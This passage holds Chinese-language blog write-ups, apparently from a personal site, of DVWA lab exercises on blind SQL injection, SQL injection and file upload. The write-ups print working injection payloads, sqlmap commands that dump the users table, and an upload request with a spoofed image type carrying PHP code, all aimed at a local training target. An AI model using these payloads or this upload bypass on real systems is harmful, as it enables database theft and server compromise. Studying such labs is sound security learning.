一个普通表单，尝试输入数字。\n逻辑应该是检测这个用户id是否存在于数据库中，随便乱打个数字看看。\n看下目标是什么。\n猜解数据库版本。接着试一试是什么类型的注入，已知这个表单回显是存在/不存在，所以拼一个 ' or 1=1; -- 看看，把条件变成恒真。\n有效。\nLow难度：解题 用 or 连接一个子查询，SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE '5%'); --。这个查询会判断是MySQL的版本是不是5开头。依次类推很快就能解出MySQL版本号。\n1  \u0026#39; or (SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE \u0026#39;5%\u0026#39;)); --   但是很快发现行不通，因为没有权限访问 sys 这个系统库（没有报错，我只能猜是这样）。\n想了想再谷歌了一下盲注的payloads之后还行没什么头绪，union大概是不行的，因为回显只有exists和missing两种状态，union查出来也看不到。再翻了一下怎么用SQL查询MySQL版本之后发现除了show variables和sys.version之外，还可以试试version函数。用SELECT SUBSTR(VERSION(),1,1)='5'，然后逐个位判断（最好是先判断出这个字符串长度，用length(version())\u0026gt;1这样的 payload。）\n于是做出下面一系列payload（mysql版本号是x.y.z格式，肯定不低于5位，直接从5开始判断）。\n1 2  \u0026#39; or (SELECT LENGTH(VERSION())\u0026gt;5); -- true \u0026#39; or (SELECT LENGTH(VERSION())\u0026gt;6); -- false   只用了两个 payload 就确定了长度是 6。\n接着判断第一位是不是5（因为5.x还是最常用的MySQL版本），后面逐位判断。（这里略了尝试的部分）\n1 2 3 4 5 6  \u0026#39; or (SELECT SUBSTR(VERSION(),1,1)=\u0026#39;5\u0026#39;); -- true \u0026#39; or (SELECT SUBSTR(VERSION(),2,1)=\u0026#39;.\u0026#39;); -- true \u0026#39; or (SELECT SUBSTR(VERSION(),3,1)=\u0026#39;7\u0026#39;); -- true \u0026#39; or (SELECT SUBSTR(VERSION(),4,1)=\u0026#39;.\u0026#39;); -- true \u0026#39; or (SELECT SUBSTR(VERSION(),5,1)=\u0026#39;3\u0026#39;); -- true \u0026#39; or (SELECT SUBSTR(VERSION(),6,1)=\u0026#39;7\u0026#39;); -- true   所以数据库版本号是 5.7.37。\n这种无聊的爆破工作显然是应该交给脚本的。之后研究sqlmap的时候会再回头看看怎么用sqlmap盲注这里。\nMedium难度：收集信息 和SQL注入题的medium难度一模一样。\nMedium难度：解题 还是老样子，复制出请求，尝试提交个数字型注入。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  await fetch(\u0026#34;http://localhost:8080/vulnerabilities/sqli_blind/\u0026#34;, { \u0026#34;headers\u0026#34;: { \u0026#34;accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#34;, \u0026#34;accept-language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\u0026#34;, \u0026#34;cache-control\u0026#34;: \u0026#34;no-cache\u0026#34;, \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;pragma\u0026#34;: \u0026#34;no-cache\u0026#34;, \u0026#34;sec-ch-ua\u0026#34;: \u0026#34;\\\u0026#34; Not A;Brand\\\u0026#34;;v=\\\u0026#34;99\\\u0026#34;, \\\u0026#34;Chromium\\\u0026#34;;v=\\\u0026#34;100\\\u0026#34;, \\\u0026#34;Microsoft Edge\\\u0026#34;;v=\\\u0026#34;100\\\u0026#34;\u0026#34;, \u0026#34;sec-ch-ua-mobile\u0026#34;: \u0026#34;?0\u0026#34;, \u0026#34;sec-ch-ua-platform\u0026#34;: \u0026#34;\\\u0026#34;Windows\\\u0026#34;\u0026#34;, \u0026#34;sec-fetch-dest\u0026#34;: \u0026#34;document\u0026#34;, \u0026#34;sec-fetch-mode\u0026#34;: \u0026#34;navigate\u0026#34;, \u0026#34;sec-fetch-site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;sec-fetch-user\u0026#34;: \u0026#34;?1\u0026#34;, \u0026#34;upgrade-insecure-requests\u0026#34;: \u0026#34;1\u0026#34; }, \u0026#34;referrer\u0026#34;: \u0026#34;http://localhost:8080/vulnerabilities/sqli_blind/\u0026#34;, \u0026#34;referrerPolicy\u0026#34;: \u0026#34;strict-origin-when-cross-origin\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;id=999+or+1%3D1;+--+\u0026amp;Submit=Submit\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;cors\u0026#34;, \u0026#34;credentials\u0026#34;: \u0026#34;include\u0026#34; });   在id=999 or 1=1; --这个payload下返回了 exists，剩下的就是和 Low 难度差不多的方式爆破出版本号，就不复述了。\nHigh难度：收集信息 和SQL注入题的High难度差不多，但注意到题中提示变成了 Cookie ID set!，于是看一眼 Cookie。\nid直接保存在cookies里，这就简单多了。\nHigh难度：解题 复制出请求（注意复制出 NodeJS fetch，复制浏览器 fetch 不会复制出cookie），把cookie里的id改成0 or 1=1 --，URL编码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  let resp = await fetch(\u0026#34;http://localhost:8080/vulnerabilities/sqli_blind/\u0026#34;, { \u0026#34;headers\u0026#34;: { \u0026#34;accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#34;, \u0026#34;accept-language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\u0026#34;, \u0026#34;cache-control\u0026#34;: \u0026#34;no-cache\u0026#34;, \u0026#34;pragma\u0026#34;: \u0026#34;no-cache\u0026#34;, \u0026#34;sec-ch-ua\u0026#34;: \u0026#34;\\\u0026#34; Not A;Brand\\\u0026#34;;v=\\\u0026#34;99\\\u0026#34;, \\\u0026#34;Chromium\\\u0026#34;;v=\\\u0026#34;100\\\u0026#34;, \\\u0026#34;Microsoft Edge\\\u0026#34;;v=\\\u0026#34;100\\\u0026#34;\u0026#34;, \u0026#34;sec-ch-ua-mobile\u0026#34;: \u0026#34;?0\u0026#34;, \u0026#34;sec-ch-ua-platform\u0026#34;: \u0026#34;\\\u0026#34;Windows\\\u0026#34;\u0026#34;, \u0026#34;sec-fetch-dest\u0026#34;: \u0026#34;document\u0026#34;, \u0026#34;sec-fetch-mode\u0026#34;: \u0026#34;navigate\u0026#34;, \u0026#34;sec-fetch-site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;upgrade-insecure-requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;cookie\u0026#34;: \u0026#34;id=0 or 1=1 -- ; PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=high\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://localhost:8080/vulnerabilities/sqli_blind/\u0026#34;, \u0026#34;Referrer-Policy\u0026#34;: \u0026#34;strict-origin-when-cross-origin\u0026#34; }, \u0026#34;body\u0026#34;: null, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34; });   初始化一个node包（package.json把type设置成module），安装node-fetch，补个 import fetch from \u0026quot;node-fetch\u0026quot;; 然后调试上面的脚本，发现提示 MISSING。\n难道是字符型注入？改成' or 1=1 --再试一次。\n这次提示变成了exists，所以是字符型注入。接下来就是用 Low 难度的 Payload 一个一个试过去，爆破出版本号。\n总结 说说我打完盲注的想法。其实最大的问题是没信心，不知道到底什么结果，没有任何错误提示。有源码的情况下白盒还比较容易构造 payload，黑盒的情况下盲注构造payload倒是很考验心态，因为总是不成功没反应打击很大，会怀疑是不是自己判断错了。\n而且很费时间。\n想确认是否有注入点感觉最好的办法还是先拿工具脚本试水。不过有防火墙的情况下可能又有问题=。=像是or 1=1这种payload很可能被杀。工具没辙的时候还得看人有没有新点子，但这又是大佬的领域了\u0026hellip;\n嗯，我也想做大佬啊。\n","date":"2022-04-28T11:30:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-07/","title":"DVWA上手记录-SQL盲注"},{"content":"前言 SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。\n原理 拼字符串，和命令注入原理一样。\n解题 收集信息 Low难度下SQL注入是一个简单的表单。\n随便提交什么东西注意到地址栏变化。\n尝试提高难度继续观察。Medium难度下表单如下。\nHigh难度表单如下。\n任务是窃取用户1~5的密码。\nLow 难度 手工注入，先尝试用经典的'来检测。\n存在注入。比较菜，继续前先看看源码再决定用什么 payload。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  \u0026lt;?php if( isset( $_REQUEST[ \u0026#39;Submit\u0026#39; ] ) ) { // Get input  $id = $_REQUEST[ \u0026#39;id\u0026#39; ]; switch ($_DVWA[\u0026#39;SQLI_DB\u0026#39;]) { case MYSQL: // Check database  $query = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39;;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $query ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . ((is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_error($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); // Get results  while( $row = mysqli_fetch_assoc( $result ) ) { // Get values  $first = $row[\u0026#34;first_name\u0026#34;]; $last = $row[\u0026#34;last_name\u0026#34;]; // Feedback for end user  echo \u0026#34;\u0026lt;pre\u0026gt;ID: {$id}\u0026lt;br /\u0026gt;First name: {$first}\u0026lt;br /\u0026gt;Surname: {$last}\u0026lt;/pre\u0026gt;\u0026#34;; } mysqli_close($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]); break; case SQLITE: // 略 ...  break; } } ?\u0026gt;  目标SQL是SELECT first_name, last_name FROM users WHERE user_id = '$id'。在不知道被注入的SQL长什么样的时候其实比较倾向于连接一个布尔表达式，这样就有一个比较稳定的1比特观察窗口，可以拿来判断是否存在用户或者逐位猜解用户名、密码、字段名什么的。\n这里先尝试连接一个 ' or 1=1 --  确定注入的格式（注意 --后面接一个空格），但暂时不会用这个方式注入。\n先尝试下 union 联查一下表名,' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables;--，得到这样的输出。\n太长不全部截图了。接下来注意看一下可疑的表，直接 ctrl+f 在网页里搜 user，很快找到这里：\n接着找出 users 表的字段名，还是通过 information_schema ，新的 payload如下。\n1  \u0026#39; UNION SELECT c.COLUMN_NAME,c.COLUMN_TYPE FROM information_schema.`COLUMNS` c WHERE c.TABLE_SCHEMA =\u0026#39;dvwa\u0026#39; AND c.TABLE_NAME =\u0026#39;users\u0026#39;; --   注意到字段名 password，接下来再 union 查询一下 user_id 和 password 。\nunion 注入的时候有几个我觉得可能要注意的问题：\n 被注入的 SQL 查询了几个列（union的查询必须有相同数量的列），或者说有几个列的可以被观测到（查出来而且前端有变化）？这里我盲猜是两个或者三个列，所以 payload 里只写了两个列。 查询出来之后有没有别的处理？如果还有别的判断，比如是静态类型的语言，union查询的列类型不匹配；或者有别的业务逻辑没通过，都可能失败。  注入payload：' UNION SELECT user_id,password FROM users; --\n成功取得密码，但密码被哈希了，盲猜 md5，直接上 cmd5 解密。\n5和1的哈希是一样的。到这里解密就全部完成了。\nMedium 难度 注意到几点：\n 前端输入变成了下拉选择。 变成了 post 方式请求。  接着看下代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  \u0026lt;?php if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Get input  $id = $_POST[ \u0026#39;id\u0026#39; ]; $id = mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $id); switch ($_DVWA[\u0026#39;SQLI_DB\u0026#39;]) { case MYSQL: $query = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = $id;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $query) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . mysqli_error($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); // Get results  while( $row = mysqli_fetch_assoc( $result ) ) { // Display values  $first = $row[\u0026#34;first_name\u0026#34;]; $last = $row[\u0026#34;last_name\u0026#34;]; // Feedback for end user  echo \u0026#34;\u0026lt;pre\u0026gt;ID: {$id}\u0026lt;br /\u0026gt;First name: {$first}\u0026lt;br /\u0026gt;Surname: {$last}\u0026lt;/pre\u0026gt;\u0026#34;; } break; case SQLITE: // 略 ...  break; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = \u0026#34;SELECT COUNT(*) FROM users;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $query ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . ((is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_error($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]); ?\u0026gt;  注意到两个改变：\n mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $id);，对$id做了转义。 \u0026quot;SELECT first_name, last_name FROM users WHERE user_id = $id;\u0026quot;，变成了数字型注入。  按理说做了转义应该就没辙了，但还是先试试。F12从开发者工具里复制出请求，然后把id改成0 or 1=1; --，注意百分号编码而且--后面留一个空格。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  await fetch(\u0026#34;http://localhost:8080/vulnerabilities/sqli/\u0026#34;, { \u0026#34;headers\u0026#34;: { \u0026#34;accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#34;, \u0026#34;accept-language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\u0026#34;, \u0026#34;cache-control\u0026#34;: \u0026#34;no-cache\u0026#34;, \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;pragma\u0026#34;: \u0026#34;no-cache\u0026#34;, \u0026#34;sec-ch-ua\u0026#34;: \u0026#34;\\\u0026#34; Not A;Brand\\\u0026#34;;v=\\\u0026#34;99\\\u0026#34;, \\\u0026#34;Chromium\\\u0026#34;;v=\\\u0026#34;100\\\u0026#34;, \\\u0026#34;Microsoft Edge\\\u0026#34;;v=\\\u0026#34;100\\\u0026#34;\u0026#34;, \u0026#34;sec-ch-ua-mobile\u0026#34;: \u0026#34;?0\u0026#34;, \u0026#34;sec-ch-ua-platform\u0026#34;: \u0026#34;\\\u0026#34;Windows\\\u0026#34;\u0026#34;, \u0026#34;sec-fetch-dest\u0026#34;: \u0026#34;document\u0026#34;, \u0026#34;sec-fetch-mode\u0026#34;: \u0026#34;navigate\u0026#34;, \u0026#34;sec-fetch-site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;sec-fetch-user\u0026#34;: \u0026#34;?1\u0026#34;, \u0026#34;upgrade-insecure-requests\u0026#34;: \u0026#34;1\u0026#34; }, \u0026#34;referrer\u0026#34;: \u0026#34;http://localhost:8080/vulnerabilities/sqli/\u0026#34;, \u0026#34;referrerPolicy\u0026#34;: \u0026#34;strict-origin-when-cross-origin\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;id=0%20or%201%3D1%3B%20--%20\u0026amp;Submit=Submit\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;cors\u0026#34;, \u0026#34;credentials\u0026#34;: \u0026#34;include\u0026#34; });   好吧，这就直接成功了。到了这一步其实剩下的和 Low 难度就没区别了。\n不过我对那个 mysqli_real_escape_string 还是很好奇，这个函数不是拿来防 SQL 注入的？查询文档如下。\n mysqli::real_escape_string \u0026ndash; mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection\n 看用例，这个real_escape_string会把参数转义成合法的 SQL 字符串，也就是应该会转义处理特殊字符比如'，但返回结果是没有'的，所以即使用real_escape_string转义后，这个参数最多是可以被安全放到''里，但如果不是在''里的话安全隐患就一点不少。\nHigh 难度 High难度就比较怪了，从这个窗口输入1提交之后，页面直接刷新出了id对应的用户信息，这个交互是真没见过。接着审阅下源码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  \u0026lt;?php if( isset( $_SESSION [ \u0026#39;id\u0026#39; ] ) ) { // Get input  $id = $_SESSION[ \u0026#39;id\u0026#39; ]; switch ($_DVWA[\u0026#39;SQLI_DB\u0026#39;]) { case MYSQL: // Check database  $query = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39; LIMIT 1;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $query ) or die( \u0026#39;\u0026lt;pre\u0026gt;Something went wrong.\u0026lt;/pre\u0026gt;\u0026#39; ); // Get results  while( $row = mysqli_fetch_assoc( $result ) ) { // Get values  $first = $row[\u0026#34;first_name\u0026#34;]; $last = $row[\u0026#34;last_name\u0026#34;]; // Feedback for end user  echo \u0026#34;\u0026lt;pre\u0026gt;ID: {$id}\u0026lt;br /\u0026gt;First name: {$first}\u0026lt;br /\u0026gt;Surname: {$last}\u0026lt;/pre\u0026gt;\u0026#34;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]))) ? false : $___mysqli_res); break; case SQLITE: // 略 ...  break; } } ?\u0026gt;  立刻注意到 $_SESSION['id']，所以这个难度的注入点在会话信息中。此时考虑一个情况：会话保存在哪儿？Cookies 还是服务端？\n如果保存在服务端，那么此处就没有注入的可能，因为无法控制$_SESSION['id']的值。先看一眼 Cookies 里有没有。\n 事后反省：我又傻逼了。那个弹出的窗口就是让你控制 $_SESSION['id']的。\n删除一段胡乱分析的内容。\n \u0026hellip;.总之，先试试'。\n很好，还是有注入的。\n接着试一试 Low 难度的 payload：' or 1=1 --。\n好了，我觉得不用继续了，剩下无非是把 Low 难度的 payload 重复一遍。\nsqlmap 手工注入成功之后可以尝试下自动工具了。sqlmap 是一个非常著名的自动SQL注入工具，这里拿 sqlmap 玩一玩。\n直接在虚拟机里安装 sqlmap sudo apt install -y sqlmap，然后开始。\n1  sqlmap -u \u0026#39;http://localhost/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#39; --cookie \u0026#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low\u0026#39;   经过一大串输出和询问如何测试之后，得到下面的报告：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests: --- Parameter: id (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment) Payload: id=1\u0026#39; OR NOT 4667=4667#\u0026amp;Submit=Submit Type: error-based Title: MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE) Payload: id=1\u0026#39; AND EXTRACTVALUE(2744,CONCAT(0x5c,0x7170786b71,(SELECT (ELT(2744=2744,1))),0x71627a7171))-- HCVJ\u0026amp;Submit=Submit Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id=1\u0026#39; AND (SELECT 7426 FROM (SELECT(SLEEP(5)))bhNh)-- bKjP\u0026amp;Submit=Submit Type: UNION query Title: MySQL UNION query (NULL) - 2 columns Payload: id=1\u0026#39; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x64687569466e4454474c614e644e7543524f49417450684b547a506d65756c54576e56466255644a,0x71627a7171)#\u0026amp;Submit=Submit ---   sqlmap 发现 id 脆弱而且列出了三种攻击方式和对应的 payload，这里我使用的是 UNION query法，前面所说的稳定的1比特观察窗口就是 boolean-based blind，一种盲注攻击法。因为1比特的观察窗口虽然稳定但真的太小了，所以一般靠这个盲注的时候都是拿脚本跑（如上所示，比如用sqlmap来跑）。\n更让人感到惊喜的是甚至给出了id可能可以用于反射型XSS，可以说非常牛逼了。\n1  heuristic (XSS) test shows that GET parameter \u0026#39;id\u0026#39; might be vulnerable to cross-site scripting (XSS) attacks   通过添加参数还可以枚举出更多信息。\n1  sqlmap -u \u0026#39;http://localhost/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#39; --cookie \u0026#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low\u0026#39; --dbs --tables --columns   一键列出表名和字段名！\n然后我们直接用 sqlmap 列出 dvwa.users 这个表的内容。\n1  sqlmap -u \u0026#39;http://localhost/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#39; --cookie \u0026#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low\u0026#39; -D dvwa -T users --dump   完成。之后可能再专门学一学 sqlmap 可以怎么玩，DVWA 确实是个好靶场。\n总结 SQL注入还算是熟悉一点，毕竟上初中那会儿就玩过了，就是那时候不懂事根本没细看。可惜了年轻的自己就是个傻逼啊。\nSQL注入没什么可总结的，熟悉SQL之后DVWA这种简单的注入是信手拈来的事情，连源码都给了，注不进去才奇怪。之后研究sqlmap的时候可能再看看都有什么注入技巧，说不定也是可以迁移到其他地方的。\n","date":"2022-04-27T15:43:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-06/","title":"DVWA上手记录-SQL注入"},{"content":"前言 快速过一下文件上传。老写一大串没用的这次简洁点。\n原理  文件传到服务器上了。 没做好文件类型过滤和执行权限的控制，传上来的文件包含恶意代码。  上传的恶意文件被执行，于是寄。\n解题 收集信息 一个文件上传表单，提示选择图片上传。\n点击选择文件发现前端就没过滤文件类型。随便选了个文件上传。\n\u0026hellip;行，直接寄了。\nLow难度 看一眼代码，没有任何防护，逻辑清晰：取文件名，拼接到上传位置，然后把临时文件移动过去。就这样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  \u0026lt;?php if( isset( $_POST[ \u0026#39;Upload\u0026#39; ] ) ) { // Where are we going to be writing to?  $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026#34;hackable/uploads/\u0026#34;; $target_path .= basename( $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;name\u0026#39; ] ); // Can we move the file to the upload folder?  if( !move_uploaded_file( $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;tmp_name\u0026#39; ], $target_path ) ) { // No  echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;\u0026#39;; } else { // Yes!  echo \u0026#34;\u0026lt;pre\u0026gt;{$target_path}succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026#34;; } } ?\u0026gt;  直接传一个 php 文件也不会拦，所以直接传个上去。就刚才的 1.php 好了。然后访问。\n成功。\nMedium难度 前端没变化，看源码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  \u0026lt;?php if( isset( $_POST[ \u0026#39;Upload\u0026#39; ] ) ) { // Where are we going to be writing to?  $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026#34;hackable/uploads/\u0026#34;; $target_path .= basename( $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;name\u0026#39; ] ); // File information  $uploaded_name = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;name\u0026#39; ]; $uploaded_type = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;type\u0026#39; ]; $uploaded_size = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;size\u0026#39; ]; // Is it an image?  if( ( $uploaded_type == \u0026#34;image/jpeg\u0026#34; || $uploaded_type == \u0026#34;image/png\u0026#34; ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) ) { // Can we move the file to the upload folder?  if( !move_uploaded_file( $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;tmp_name\u0026#39; ], $target_path ) ) { // No  echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;\u0026#39;; } else { // Yes!  echo \u0026#34;\u0026lt;pre\u0026gt;{$target_path}succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026#34;; } } else { // Invalid file  echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded. We can only accept JPEG or PNG images.\u0026lt;/pre\u0026gt;\u0026#39;; } } ?\u0026gt;  主要变化出现在 if( ( $uploaded_type == \u0026quot;image/jpeg\u0026quot; || $uploaded_type == \u0026quot;image/png\u0026quot; ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) ) 这段代码。uploaded_type 是 $_FILES['uploaded']['type']，查文档可知\n类型信息是由浏览器提供的，因此可以选择自己构造一个文件上传请求，改掉 Content-Type 之后发出去。偷懒直接把 Low 难度下的文件上传请求右键复制 fetch 出来（edge/chrome 对 multipart/form-data 的请求不能复制出请求体，这一步只能用火狐），把复制出来的命令的 body 里：\n Content-Type 改成 image/jpeg。 文件名改成 2.php，以区别于 Low 难度下的 1.php  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  await fetch(\u0026#34;http://localhost:8080/vulnerabilities/upload/#\u0026#34;, { \u0026#34;credentials\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;headers\u0026#34;: { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;Sec-Fetch-Dest\u0026#34;: \u0026#34;document\u0026#34;, \u0026#34;Sec-Fetch-Mode\u0026#34;: \u0026#34;navigate\u0026#34;, \u0026#34;Sec-Fetch-Site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;Sec-Fetch-User\u0026#34;: \u0026#34;?1\u0026#34; }, \u0026#34;referrer\u0026#34;: \u0026#34;http://localhost:8080/vulnerabilities/upload/\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;MAX_FILE_SIZE\\\u0026#34;\\r\\n\\r\\n100000\\r\\n-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;uploaded\\\u0026#34;; filename=\\\u0026#34;2.php\\\u0026#34;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n\u0026lt;?php phpinfo(); ?\u0026gt;\\r\\n-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;Upload\\\u0026#34;\\r\\n\\r\\nUpload\\r\\n-----------------------------257607891334311387353687588123--\\r\\n\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;cors\u0026#34; });   然后贴回浏览器控制台执行。\n成功。\nHigh难度 观察源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  \u0026lt;?php if( isset( $_POST[ \u0026#39;Upload\u0026#39; ] ) ) { // Where are we going to be writing to?  $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026#34;hackable/uploads/\u0026#34;; $target_path .= basename( $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;name\u0026#39; ] ); // File information  $uploaded_name = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;name\u0026#39; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, \u0026#39;.\u0026#39; ) + 1); $uploaded_size = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;size\u0026#39; ]; $uploaded_tmp = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;tmp_name\u0026#39; ]; // Is it an image?  if( ( strtolower( $uploaded_ext ) == \u0026#34;jpg\u0026#34; || strtolower( $uploaded_ext ) == \u0026#34;jpeg\u0026#34; || strtolower( $uploaded_ext ) == \u0026#34;png\u0026#34; ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) \u0026amp;\u0026amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder?  if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 